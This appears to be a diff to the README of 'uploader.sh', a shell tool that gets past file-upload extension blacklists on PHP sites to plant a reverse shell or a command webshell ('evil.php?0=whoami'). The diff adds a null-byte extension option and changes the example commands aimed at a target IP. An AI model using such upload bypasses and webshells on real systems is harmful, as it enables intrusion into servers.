@@ -17,11 +17,13 @@ A simple shell script that attempts to bypass extension blacklists for file uplo
 
 `-b`: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. `/evil.php?0=whoami`) . Incompatible with `-e`
 
+`-a <EXTENSION>`: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.
+
  For example,
 
- `./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/`
+ `./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png`
 
- `./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -b`
+ `./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b`
 
 ## Functionality
 As of now, Uploader is only designed for PHP based Web Applications that have file upload functionality using a POST request to send Boundary (multipart) Data.
